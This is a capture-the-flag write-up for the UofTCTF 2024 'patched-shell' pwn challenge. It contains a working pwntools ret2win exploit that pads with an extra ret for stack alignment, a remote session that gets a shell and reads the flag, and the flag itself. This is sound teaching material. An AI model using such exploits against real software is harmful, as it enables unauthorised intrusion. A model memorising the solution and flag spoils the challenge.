# patched-shell [199 Solves]

## Description

> Okay, okay. So you were smart enough to do basic overflow huh...
>
> Now try this challenge!
> I patched the shell function so it calls system instead of execve...
> so now your exploit shouldn't work! bwahahahahaha
>
> Note: due to the copycat nature of this challenge, it suffers from the same bug that was in basic-overflow. see the cryptic message there for more information.
>
> Author: drec
>
> `nc 34.134.173.142 5000`
>
> Attachments: patched-shell

## Short Solution

ret2win with extra ret instruction

## Solution

### Basic file checks

```console
$ file patched-shell
patched-shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=01a5881d2bccff210f4617e1ed4586e58b213ca1, for GNU/Linux 4.4.0, not stripped

$ checksec patched-shell
[*] '/root/ctf/UofTCTF_2024/pwn/patched-shell/patched-shell'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### solver.py

SIGSEGV on movaps so pad extra ret instruction.

Ref: [Beginners' guide](https://ropemporium.com/guide.html#Common%20pitfalls)

> The MOVAPS issue
> If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). ... (snip) ... movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.

```python
from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "split-window", "-h"]

elf = ELF("./patched-shell", checksec=False)
rop = ROP(elf)
ret = rop.ret.address


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("34.134.173.142", 5000)

    elif args.GDB:
        gdbscript = """
        c
        """
        pty = process.PTY
        io = gdb.debug([elf.path], gdbscript=gdbscript, stdin=pty, stdout=pty)
    else:
        pty = process.PTY
        io = elf.process(stdin=pty, stdout=pty)

    return io


def main():
    payload = b"A" * cyclic_find("saaa")
    payload += p64(ret) + p64(elf.sym["shell"])

    io = conn()
    io.sendline(payload)

    io.interactive("")


if __name__ == "__main__":
    main()
```

Result:

```console
$ python3 solver.py REMOTE
[*] Loaded 5 cached gadgets for './patched-shell'
[+] Opening connection to 34.134.173.142 on port 5000: Done
[DEBUG] Sent 0x59 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  1a 10 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000050  36 11 40 00  00 00 00 00  0a                        │6·@·│····│·│
    00000059
[*] Switching to interactive mode
ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x9 bytes:
    b'flag\n'
    b'run\n'
flag
run
cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x24 bytes:
    b'uoftctf{patched_the_wrong_function}\n'
uoftctf{patched_the_wrong_function}
```

### Flag

uoftctf{patched_the_wrong_function}
